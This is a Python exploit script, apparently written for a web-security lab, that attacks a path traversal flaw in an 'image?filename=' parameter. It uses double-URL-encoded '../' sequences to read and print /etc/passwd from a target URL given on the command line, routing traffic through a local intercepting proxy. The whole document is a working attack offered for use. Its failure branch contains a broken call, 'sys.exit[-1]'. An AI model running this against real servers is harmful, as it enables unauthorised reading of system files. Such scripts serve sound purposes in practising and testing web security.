import sys
import urllib3
import requests
urllib3.disable_warnings(urllib3.exceptions.SecurityWarning)

proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

def path_traversal_exploit(url):
    image_path = url + 'image?filename=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd'
    r = requests.get(image_path,verify=False,proxies=proxies)
    if 'bin:x' in r.text:
        print('[+] Exploit Successful')
        print('[+] Here\'s the content of etc/passwd\n')
        print(r.text)
    else:
        print('[-]Exploit was Unsuccessful, try again')
        sys.exit[-1]

def main():
    if len(sys.argv) != 2:
        print('[-] Error!')
        print('[+] Usage %s url' % sys.argv[0])
        print('[+] Example: %s www.example.com' % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print('[+] Exploiting Path traversal vulnerability')
    path_traversal_exploit(url)

if __name__ == "__main__":
    main()